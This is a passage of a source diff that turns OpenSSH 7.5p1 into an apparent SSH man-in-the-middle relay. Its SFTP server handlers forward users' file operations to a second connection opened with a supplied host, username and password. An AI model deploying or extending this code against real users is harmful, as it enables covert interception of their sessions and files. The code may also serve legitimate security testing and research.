+	    fatal("%s: buffer error: %s",
+		  __func__, ssh_err(r));
+	  debug3("Received SSH2_FXP_STATUS %d", rstatus);
+
+	  sshbuf_free(msg); msg = NULL;
+	  *status = rstatus;
+	  return NULL;
+	} else if (type != SSH2_FXP_NAME)
+	  fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
+		SSH2_FXP_NAME, type);
+
+	if ((r = sshbuf_get_u32(msg, count)) != 0)
+	  fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	if (*count > SSHBUF_SIZE_MAX)
+	  fatal("%s: nonsensical number of entries", __func__);
+	if (*count == 0) {
+	  sshbuf_free(msg); msg = NULL;
+	  *status = SSH2_FX_EOF;
+	  return NULL;
+	}
+
+	debug3("Received %d SSH2_FXP_NAME responses", *count);
+
+	ret = xcalloc(*count, sizeof(Stat));
+
+	for (i = 0; i < *count; i++) {
+	  char *name, *long_name;
+	  Attrib a;
+
+	  if ((r = sshbuf_get_cstring(msg, &name, NULL)) != 0 ||
+	      (r = sshbuf_get_cstring(msg, &long_name, NULL)) != 0)
+	    fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	  if ((r = decode_attrib(msg, &a)) != 0) {
+	    free(name); name = NULL;
+	    free(long_name); long_name = NULL;
+	    sshbuf_free(msg); msg = NULL;
+	    *status = SSH2_FX_FAILURE;
+	    return NULL;
+	  }
+	  ret[i].name = name;
+	  ret[i].long_name = long_name;
+	  ret[i].attrib = a;
+	}
+
+	sshbuf_free(msg); msg = NULL;
+	return ret;
+}
+
+u_int
+mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len)
+{
+	u_int id;
+	struct sshbuf *msg;
+	int r;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_CLOSE)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg); msg = NULL;
+
+	debug3("Sent message SSH2_FXP_CLOSE I:%u", id);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_MKDIR, path, strlen(path), a);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rmdir(struct sftp_conn *conn, const char *path)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_RMDIR, path, strlen(path));
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rm(struct sftp_conn *conn, const char *path)
+{
+	u_int id;
+
+	id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_REMOVE, path, strlen(path));
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r, use_ext = (conn->exts & SFTP_EXT_POSIX_RENAME) && !force_legacy;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send rename request */
+	id = conn->msg_id++;
+	if (use_ext) {
+		if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+		    (r = sshbuf_put_u32(msg, id)) != 0 ||
+		    (r = sshbuf_put_cstring(msg,
+		    "posix-rename@openssh.com")) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	} else {
+		if ((r = sshbuf_put_u8(msg, SSH2_FXP_RENAME)) != 0 ||
+		    (r = sshbuf_put_u32(msg, id)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	}
+	if ((r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message %s \"%s\" -> \"%s\"",
+	    use_ext ? "posix-rename@openssh.com" :
+	    "SSH2_FXP_RENAME", oldpath, newpath);
+	sshbuf_free(msg); msg = NULL;
+
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a)
+{
+	u_int id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_SETSTAT, path, strlen(path), a);
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a)
+{
+	u_int id = conn->msg_id++;
+	send_string_attrs_request(conn, id, SSH2_FXP_FSETSTAT, handle, handle_len, a);
+	return get_status(conn, id);
+}
+
+Attrib *
+mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status)
+{
+	u_int id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_FSTAT, handle, handle_len);
+	return(get_decode_stat(conn, id, quiet, status));
+}
+
+/* Returns 1 on success, with "filename", "longname", and "a" args set to the values obtained, or 0 on failure, with "status" arg set. */
+int
+mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a)
+{
+	struct sshbuf *msg;
+	u_int expected_id, count, id;
+	u_char type;
+	int r;
+
+	expected_id = id = conn->msg_id++;
+	send_string_request(conn, id, SSH2_FXP_READLINK, path, strlen(path));
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	get_msg(conn, msg);
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	if (id != expected_id)
+		fatal("ID mismatch (%u != %u)", id, expected_id);
+
+	if (type == SSH2_FXP_STATUS) {
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+		sshbuf_free(msg); msg = NULL;
+		return 0;
+	} else if (type != SSH2_FXP_NAME)
+		fatal("Expected SSH2_FXP_NAME(%u) packet, got %u",
+		    SSH2_FXP_NAME, type);
+
+	if ((r = sshbuf_get_u32(msg, &count)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	if (count != 1)
+		fatal("Got multiple names (%d) from SSH_FXP_READLINK", count);
+
+	if ((r = sshbuf_get_cstring(msg, filename, NULL)) != 0 ||
+	    (r = sshbuf_get_cstring(msg, longname, NULL)) != 0 ||
+	    (r = decode_attrib(msg, a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("SSH_FXP_READLINK %s -> %s", path, *filename);
+	sshbuf_free(msg); msg = NULL;
+	return 1;
+}
+
+u_int
+mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	if (conn->version < 3)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send symlink request */
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_SYMLINK)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message SSH2_FXP_SYMLINK \"%s\" -> \"%s\"", oldpath,
+	    newpath);
+	sshbuf_free(msg); msg = NULL;
+
+	return get_status(conn, id);
+}
+
+int
+mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+	struct sftp_statvfs sftp_st;
+
+	if ((conn->exts & SFTP_EXT_STATVFS) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	sshbuf_reset(msg);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "statvfs@openssh.com")) != 0 ||
+	    (r = sshbuf_put_cstring(msg, path)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg); msg = NULL;
+
+	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
+	  return -1;
+
+	st->f_bsize = sftp_st.f_bsize;
+	st->f_frsize = sftp_st.f_frsize;
+	st->f_blocks = sftp_st.f_blocks;
+	st->f_bfree = sftp_st.f_bfree;
+	st->f_bavail = sftp_st.f_bavail;
+	st->f_files = sftp_st.f_files;
+	st->f_ffree = sftp_st.f_ffree;
+	st->f_favail = sftp_st.f_favail;
+	st->f_fsid = sftp_st.f_fsid;
+	st->f_flag = sftp_st.f_flag;
+	st->f_namemax = sftp_st.f_namemax;
+	return 1;
+}
+
+int
+mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status)
+{
+	struct sshbuf *msg;
+	int r;
+	u_int id;
+	struct sftp_statvfs sftp_st;
+
+	if ((conn->exts & SFTP_EXT_FSTATVFS) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	id = conn->msg_id++;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	sshbuf_reset(msg);
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "fstatvfs@openssh.com")) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	sshbuf_free(msg); msg = NULL;
+
+	if (get_decode_statvfs(conn, &sftp_st, id, 1, status) == -1)
+	  return -1;
+
+	st->f_bsize = sftp_st.f_bsize;
+	st->f_frsize = sftp_st.f_frsize;
+	st->f_blocks = sftp_st.f_blocks;
+	st->f_bfree = sftp_st.f_bfree;
+	st->f_bavail = sftp_st.f_bavail;
+	st->f_files = sftp_st.f_files;
+	st->f_ffree = sftp_st.f_ffree;
+	st->f_favail = sftp_st.f_favail;
+	st->f_fsid = sftp_st.f_fsid;
+	st->f_flag = sftp_st.f_flag;
+	st->f_namemax = sftp_st.f_namemax;
+	return 1;
+}
+
+u_int
+mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	if ((conn->exts & SFTP_EXT_HARDLINK) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	/* Send link request */
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "hardlink@openssh.com")) != 0 ||
+	    (r = sshbuf_put_cstring(msg, oldpath)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, newpath)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message hardlink@openssh.com \"%s\" -> \"%s\"",
+	       oldpath, newpath);
+	sshbuf_free(msg); msg = NULL;
+
+	return get_status(conn, id);
+}
+
+u_int
+mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len)
+{
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	/* Silently return if the extension is not supported */
+	if ((conn->exts & SFTP_EXT_FSYNC) == 0)
+		return SSH2_FX_OP_UNSUPPORTED;
+
+	/* Send fsync request */
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_EXTENDED)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, "fsync@openssh.com")) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, (u_int)handle_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message fsync@openssh.com I:%u", id);
+	sshbuf_free(msg); msg = NULL;
+
+	return get_status(conn, id);
+}
+
+/* Returns the handle on success (which must be free()'ed by the caller) and sets the "handle_len" arg, or NULL.  On failure, the "status" arg is set. */
+u_char *
+mitm_do_open(struct sftp_conn *conn, char *remote_path, u_int32_t pflags, Attrib *a, size_t *handle_len, u_int *status) {
+	u_char *handle = NULL;
+	struct sshbuf *msg;
+	u_int id;
+	int r;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_OPEN)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_cstring(msg, remote_path)) != 0 ||
+	    (r = sshbuf_put_u32(msg, pflags)) != 0 ||
+	    (r = encode_attrib(msg, a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	send_msg(conn, msg);
+	debug3("Sent message SSH2_FXP_OPEN I:%u P:%s", id, remote_path);
+
+	handle = get_handle(conn, id, status, handle_len, "remote open(\"%s\")", remote_path);
+	sshbuf_free(msg); msg = NULL;
+	return handle;
+}
+
+/* Returns a pointer to a char buffer of read data on success (which must be free()'ed by the caller) with the "read_len" argument set with the number bytes returned, or NULL on failure with the "status" arg set accordingly. */
+u_char *
+mitm_do_read(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_int32_t read_len, size_t *ret_len, u_int *status) {
+	struct sshbuf *msg;
+	int r;
+	u_int id;
+	u_char type;
+	u_char *ret = NULL;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_READ)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, handle_len)) != 0 ||
+	    (r = sshbuf_put_u64(msg, offset)) != 0 ||
+	    (r = sshbuf_put_u32(msg, read_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	send_msg(conn, msg);
+	sshbuf_reset(msg);
+	get_msg(conn, msg);
+
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	if (type == SSH2_FXP_STATUS) {
+		if ((r = sshbuf_get_u32(msg, status)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+		sshbuf_free(msg); msg = NULL;
+		*ret_len = 0;
+		return NULL;
+	} else if (type == SSH2_FXP_DATA) {
+		if ((r = sshbuf_get_string(msg, &ret, ret_len)) != 0)
+			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	} else
+		fatal("%s: unexpected type received: %u", __func__, type);
+
+	sshbuf_free(msg); msg = NULL;
+	return ret;
+}
+
+u_int
+mitm_do_write(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_char *buf, u_int buf_len) {
+	struct sshbuf *msg;
+	int r;
+	u_int id;
+	u_char type;
+	u_int status = 0;
+
+	if ((msg = sshbuf_new()) == NULL)
+		fatal("%s: sshbuf_new failed", __func__);
+
+	id = conn->msg_id++;
+	if ((r = sshbuf_put_u8(msg, SSH2_FXP_WRITE)) != 0 ||
+	    (r = sshbuf_put_u32(msg, id)) != 0 ||
+	    (r = sshbuf_put_string(msg, handle, handle_len)) != 0 ||
+	    (r = sshbuf_put_u64(msg, offset)) != 0 ||
+	    (r = sshbuf_put_string(msg, buf, buf_len)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	send_msg(conn, msg);
+	sshbuf_reset(msg);
+	get_msg(conn, msg);
+
+	if ((r = sshbuf_get_u8(msg, &type)) != 0 ||
+	    (r = sshbuf_get_u32(msg, &id)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	if (type != SSH2_FXP_STATUS)
+		fatal("Expected SSH2_FXP_STATUS(%d) packet, got %d", SSH2_FXP_STATUS, type);
+
+	if ((r = sshbuf_get_u32(msg, &status)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	sshbuf_free(msg); msg = NULL;
+	return status;
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.h openssh-7.5p1-mitm/sftp-client.h
--- openssh-7.5p1/sftp-client.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-client.h	2017-07-24 15:25:11.267472551 -0400
@@ -21,6 +21,9 @@
 #ifndef _SFTP_CLIENT_H
 #define _SFTP_CLIENT_H
 
+#include <sys/statvfs.h>
+#include "misc.h"
+
 #ifdef USE_SYSTEM_GLOB
 # include <glob.h>
 #else
@@ -53,6 +56,23 @@
 	u_int64_t f_namemax;
 };
 
+struct sftp_conn {
+	int fd_in;
+	int fd_out;
+	u_int transfer_buflen;
+	u_int num_requests;
+	u_int version;
+	u_int msg_id;
+#define SFTP_EXT_POSIX_RENAME	0x00000001
+#define SFTP_EXT_STATVFS	0x00000002
+#define SFTP_EXT_FSTATVFS	0x00000004
+#define SFTP_EXT_HARDLINK	0x00000008
+#define SFTP_EXT_FSYNC		0x00000010
+	u_int exts;
+	u_int64_t limit_kbps;
+	struct bwlimit bwlimit_in, bwlimit_out;
+};
+
 /*
  * Initialise a SSH filexfer connection. Returns NULL on error or
  * a pointer to a initialized sftp_conn struct on success.
@@ -80,10 +100,10 @@
 int do_rmdir(struct sftp_conn *, const char *);
 
 /* Get file attributes of 'path' (follows symlinks) */
-Attrib *do_stat(struct sftp_conn *, const char *, int);
+Attrib *do_stat(struct sftp_conn *, const char *, int, u_int *);
 
 /* Get file attributes of 'path' (does not follow symlinks) */
-Attrib *do_lstat(struct sftp_conn *, const char *, int);
+Attrib *do_lstat(struct sftp_conn *, const char *, int, u_int *);
 
 /* Set file attributes of 'path' */
 int do_setstat(struct sftp_conn *, const char *, Attrib *);
@@ -139,4 +159,42 @@
 /* Concatenate paths, taking care of slashes. Caller must free result. */
 char *path_append(const char *, const char *);
 
+u_int mitm_do_close(struct sftp_conn *conn, const u_char *handle, u_int handle_len);
+
+u_int mitm_do_fsetstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, Attrib *a);
+
+Attrib *mitm_do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len, int quiet, u_int *status);
+
+int mitm_do_fstatvfs(struct sftp_conn *conn, const u_char *handle, size_t handle_len, struct statvfs *st, u_int *status);
+
+u_int mitm_do_fsync(struct sftp_conn *conn, u_char *handle, size_t handle_len);
+
+u_int mitm_do_hardlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
+
+u_int mitm_do_mkdir(struct sftp_conn *conn, const char *path, Attrib *a);
+
+u_char *mitm_do_open(struct sftp_conn *conn, char *remote_path, u_int32_t pflags, Attrib *a, size_t *handle_len, u_int *status);
+
+u_char *mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status);
+
+u_char *mitm_do_read(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_int32_t read_len, size_t *ret_len, u_int *status);
+
+Stat *mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status);
+
+int mitm_do_readlink(struct sftp_conn *conn, const char *path, u_int *status, char **filename, char **longname, Attrib *a);
+
+u_int mitm_do_rename(struct sftp_conn *conn, const char *oldpath, const char *newpath, int force_legacy);
+
+u_int mitm_do_rmdir(struct sftp_conn *conn, const char *path);
+
+u_int mitm_do_rm(struct sftp_conn *conn, const char *path);
+
+u_int mitm_do_setstat(struct sftp_conn *conn, const char *path, Attrib *a);
+
+int mitm_do_statvfs(struct sftp_conn *conn, const char *path, struct statvfs *st, u_int *status);
+
+u_int mitm_do_symlink(struct sftp_conn *conn, const char *oldpath, const char *newpath);
+
+u_int mitm_do_write(struct sftp_conn *conn, const u_char *handle, u_int handle_len, u_int64_t offset, u_char *buf, u_int buf_len);
+
 #endif
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-common.h openssh-7.5p1-mitm/sftp-common.h
--- openssh-7.5p1/sftp-common.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-common.h	2017-07-24 15:25:11.267472551 -0400
@@ -50,3 +50,12 @@
 char	*ls_file(const char *, const struct stat *, int, int);
 
 const char *fx2txt(int);
+
+/* portable attributes, etc. */
+typedef struct Stat Stat;
+
+struct Stat {
+	char *name;
+	char *long_name;
+	Attrib attrib;
+};
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-glob.c openssh-7.5p1-mitm/sftp-glob.c
--- openssh-7.5p1/sftp-glob.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-glob.c	2017-07-24 15:25:11.267472551 -0400
@@ -111,8 +111,9 @@
 fudge_lstat(const char *path, struct stat *st)
 {
 	Attrib *a;
+	u_int status;
 
-	if (!(a = do_lstat(cur.conn, (char *)path, 1)))
+	if (!(a = do_lstat(cur.conn, (char *)path, 1, &status)))
 		return(-1);
 
 	attrib_to_stat(a, st);
@@ -124,8 +125,9 @@
 fudge_stat(const char *path, struct stat *st)
 {
 	Attrib *a;
+	u_int status;
 
-	if (!(a = do_stat(cur.conn, (char *)path, 1)))
+	if (!(a = do_stat(cur.conn, (char *)path, 1, &status)))
 		return(-1);
 
 	attrib_to_stat(a, st);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.h openssh-7.5p1-mitm/sftp.h
--- openssh-7.5p1/sftp.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp.h	2017-07-24 15:25:11.267472551 -0400
@@ -97,5 +97,5 @@
 
 struct passwd;
 
-int	sftp_server_main(int, char **, struct passwd *);
+int	sftp_server_main(int, char **, struct passwd *, char *, unsigned short, char *, char *);
 void	sftp_server_cleanup_exit(int) __attribute__((noreturn));
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server.c openssh-7.5p1-mitm/sftp-server.c
--- openssh-7.5p1/sftp-server.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-server.c	2017-07-24 15:25:11.267472551 -0400
@@ -39,6 +39,7 @@
 #include <time.h>
 #include <unistd.h>
 #include <stdarg.h>
+#include <sys/wait.h>
 
 #include "xmalloc.h"
 #include "sshbuf.h"
@@ -50,6 +51,7 @@
 
 #include "sftp.h"
 #include "sftp-common.h"
+#include "sftp-client.h"
 
 /* Our verbosity */
 static LogLevel log_level = SYSLOG_LEVEL_ERROR;
@@ -74,14 +76,11 @@
 /* Requests that are allowed/denied */
 static char *request_whitelist, *request_blacklist;
 
-/* portable attributes, etc. */
-typedef struct Stat Stat;
+pid_t sshpid = -1;
+volatile sig_atomic_t interrupted = 0;
+int showprogress = 0;
+extern struct sftp_conn *client_conn;
 
-struct Stat {
-	char *name;
-	char *long_name;
-	Attrib attrib;
-};
 
 /* Packet handlers */
 static void process_open(u_int32_t id);
@@ -108,6 +107,7 @@
 static void process_extended_hardlink(u_int32_t id);
 static void process_extended_fsync(u_int32_t id);
 static void process_extended(u_int32_t id);
+struct sftp_conn *make_connection(char *host, unsigned short port, char *username, char *password);
 
 struct sftp_handler {
 	const char *name;	/* user-visible name for fine-grained perms */
@@ -179,6 +179,7 @@
 	return 1;
 }
 
+/*
 static int
 errno_to_portable(int unixerrno)
 {
@@ -265,6 +266,7 @@
 
 	return ret;
 }
+*/
 
 /* handle handles */
 
@@ -289,6 +291,7 @@
 u_int num_handles = 0;
 int first_unused_handle = -1;
 
+/*
 static void handle_unused(int i)
 {
 	handles[i].use = HANDLE_UNUSED;
@@ -321,6 +324,7 @@
 
 	return i;
 }
+*/
 
 static int
 handle_is_ok(int i, int type)
@@ -328,6 +332,7 @@
 	return i >= 0 && (u_int)i < num_handles && handles[i].use == type;
 }
 
+/*
 static int
 handle_to_string(int handle, u_char **stringp, int *hlenp)
 {
@@ -338,6 +343,7 @@
 	*hlenp = sizeof(int32_t);
 	return 0;
 }
+*/
 
 static int
 handle_from_string(const u_char *handle, u_int hlen)
@@ -362,6 +368,7 @@
 	return NULL;
 }
 
+/*
 static DIR *
 handle_to_dir(int handle)
 {
@@ -399,6 +406,7 @@
 	if (handle_is_ok(handle, HANDLE_FILE) && bytes > 0)
 		handles[handle].bytes_write += bytes;
 }
+*/
 
 static u_int64_t
 handle_bytes_read(int handle)
@@ -416,6 +424,7 @@
 	return 0;
 }
 
+/*
 static int
 handle_close(int handle)
 {
@@ -434,6 +443,7 @@
 	}
 	return ret;
 }
+*/
 
 static void
 handle_log_close(int handle, char *emsg)
@@ -461,6 +471,7 @@
 			handle_log_close(i, "forced");
 }
 
+/*
 static int
 get_handle(struct sshbuf *queue, int *hp)
 {
@@ -476,6 +487,28 @@
 	free(handle);
 	return 0;
 }
+*/
+
+/* Handle return value must be free()'ed. */
+int
+get_handle_all(struct sshbuf *queue, u_char **handle_str, size_t *handle_len, int *handle_int)
+{
+	int r;
+
+	if ((r = sshbuf_get_string(queue, handle_str, handle_len)) != 0)
+	  return r;
+
+	if (*handle_len < 256)
+		*handle_int = handle_from_string(*handle_str, *handle_len);
+	else {
+		free(*handle_str); *handle_str = NULL;
+		*handle_len = 0;
+		*handle_int = -1;
+		return -1;
+	}
+
+	return 0;
+}
 
 /* send replies */
 
@@ -555,6 +588,7 @@
 	send_data_or_handle(SSH2_FXP_DATA, id, data, dlen);
 }
 
+/*
 static void
 send_handle(u_int32_t id, int handle)
 {
@@ -566,6 +600,15 @@
 	send_data_or_handle(SSH2_FXP_HANDLE, id, string, hlen);
 	free(string);
 }
+*/
+
+static void
+send_handle_str(u_int32_t id, u_char *handle, size_t handle_len)
+{
+	debug("request %u: sent handle_str handle %d", id, atoi(handle));
+	send_data_or_handle(SSH2_FXP_HANDLE, id, handle, handle_len);
+}
+
 
 static void
 send_names(u_int32_t id, int count, const Stat *stats)
@@ -678,14 +721,18 @@
 	u_int32_t pflags;
 	Attrib a;
 	char *name;
-	int r, handle, fd, flags, mode, status = SSH2_FX_FAILURE;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	u_int status = 0;
+	int r;
 
 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0 ||
 	    (r = sshbuf_get_u32(iqueue, &pflags)) != 0 || /* portable flags */
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug3("request %u: open flags %d", id, pflags);
+	debug3("request %u: open \"%s\" flags %d", id, name, pflags);
+	/*
 	flags = flags_from_portable(pflags);
 	mode = (a.flags & SSH2_FILEXFER_ATTR_PERMISSIONS) ? a.perm : 0666;
 	logit("open \"%s\" flags %s mode 0%o",
@@ -711,12 +758,22 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	handle_str = mitm_do_open(client_conn, name, pflags, &a, &handle_len, &status);
+	if (handle_str != NULL) {
+		debug3("request %u: open \"%s\" returning handle: %d", id, name, handle_from_string(handle_str, handle_len));
+		send_handle_str(id, handle_str, handle_len);
+	} else
+		send_status(id, status);
+
+	free(handle_str);  handle_str = NULL;
 	free(name);
 }
 
 static void
 process_close(u_int32_t id)
 {
+	/*
 	int r, handle, ret, status = SSH2_FX_FAILURE;
 
 	if ((r = get_handle(iqueue, &handle)) != 0)
@@ -727,11 +784,25 @@
 	ret = handle_close(handle);
 	status = (ret == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int status;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	debug3("request %u: close handle %u", id, handle_int);
+	status = mitm_do_close(client_conn, handle_str, handle_len);
+	send_status(id, status);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
 process_read(u_int32_t id)
 {
+	/*
 	u_char buf[64*1024];
 	u_int32_t len;
 	int r, handle, fd, ret, status = SSH2_FX_FAILURE;
